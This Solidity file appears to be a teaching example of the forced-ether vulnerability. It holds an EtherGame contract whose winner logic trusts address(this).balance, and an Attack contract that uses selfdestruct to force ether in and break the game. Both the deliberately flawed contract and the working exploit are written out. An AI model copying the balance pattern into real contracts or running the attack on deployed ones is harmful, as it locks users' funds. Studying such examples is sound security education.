//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;
contract EtherGame {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether"); 
        uint256 balance = address(this).balance;

        require(balance <= TARGET_AMOUNT, "Game is over");

        if(balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Only winner can claim the reward");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send ETHER");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(address _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}